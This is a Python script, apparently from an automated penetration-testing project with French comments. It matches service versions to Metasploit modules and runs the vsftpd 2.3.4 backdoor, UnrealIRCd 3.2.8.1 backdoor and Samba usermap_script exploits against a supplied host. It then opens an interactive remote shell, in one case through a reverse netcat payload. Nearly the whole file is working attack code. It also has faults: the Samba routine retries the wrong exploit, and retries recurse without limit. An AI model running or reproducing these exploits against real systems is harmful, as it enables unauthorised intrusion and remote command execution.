# File with all the exploits that will be called by the main program
# DMO
# scalability

from pymetasploit3.msfrpc import MsfRpcClient

def compare_exploit(product, version):
    exploit_deck = [
        {"product": "Samba smbd", "version": "3.X - 4.X", "exploit": "usermap_script"},
        {"product": "vsftpd", "version": "2.3.4", "exploit": "vsftpd_234_backdoor"},
        {"product": "UnrealIRCd", "version": "", "exploit": "unreal_ircd_3281_backdoor"},
        # Ajouter exploit ici pour scalabilit√©
    ]
    for exploit in exploit_deck:
        if exploit["product"] == product and exploit["version"] == version:
            return exploit["exploit"]
    return "No exploit found"

def use_exploit(exploit,host):
    func = getattr(__import__("exploit_deck"), exploit)
    func(host)

# LISTE DES EXPLOITS
# Ajouter les exploits ici et leur config metasploit
# Voir exploit vsftpd_234_backdoor pour exemple

def vsftpd_234_backdoor(host):
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor') # On charge l'exploit
    # On configure l'exploitv
    exploit['RHOSTS'] = host
    exploit['RPORT'] = "21"
    # On lance l'exploit
    exploit.execute(payload="cmd/unix/interact")
    print("Exploit launched")

    print("Checking if sessions are available...")
    if( client.sessions.list == {}):
        print("No session available")
        # We retry it
        vsftpd_234_backdoor(host)
    else:
        print("Opening shell...")
        # We get the highest session number
        shell = client.sessions.session(list(client.sessions.list.keys())[-1])
        print(list(client.sessions.list.keys())[-1])
        # We get an interactive shell with the session
        shell.write('whoami')
        print(shell.read()) 
        while True:
            cmd = input("$ ")
            if cmd == "exit":
                break
            shell.write(cmd)
            print(shell.read())
        shell.stop()
        print("Exploit finished")

    return "Exploit ended"

def unreal_ircd_3281_backdoor(host):
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor') # On charge l'exploit
    # On configure l'exploit
    exploit['RHOSTS'] = host
    # On lance l'exploit
    exploit.execute(payload="cmd/unix/interact")
    print("Exploit launched")

    print("Checking if sessions are available...")
    if( client.sessions.list == {}):
        print("No session available")
        # We retry it
        unreal_ircd_3281_backdoor(host)
    else:
        print("Opening shell...")
        # We get the highest session number
        shell = client.sessions.session(list(client.sessions.list.keys())[-1])
        print(list(client.sessions.list.keys())[-1])
        # We get an interactive shell with the session
        shell.write('whoami')
        print(shell.read()) 
        while True:
            cmd = input("$ ")
            if cmd == "exit":
                break
            shell.write(cmd)
            print(shell.read())
        shell.stop()
        print("Exploit finished")

    return "Exploit ended"

def usermap_script(host):
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    exploit = client.modules.use('exploit', 'multi/samba/usermap_script') # On charge l'exploit
    # On configure l'exploit
    exploit['RHOSTS'] = host
    exploit.execute(payload="cmd/unix/reverse_netcat")
    # On lance l'exploit
    print("Exploit launched")

    print("Checking if sessions are available...")
    if( client.sessions.list == {}):
        print("No session available")
        # We retry it
        unreal_ircd_3281_backdoor(host)
    else:
        print("Opening shell...")
        # We get the highest session number
        shell = client.sessions.session(list(client.sessions.list.keys())[-1])
        print(list(client.sessions.list.keys())[-1])
        # We get an interactive shell with the session
        shell.write('whoami')
        print(shell.read()) 
        while True:
            cmd = input("$ ")
            if cmd == "exit":
                break
            shell.write(cmd)
            print(shell.read())
        shell.stop()
        print("Exploit finished")

    return "Exploit ended"
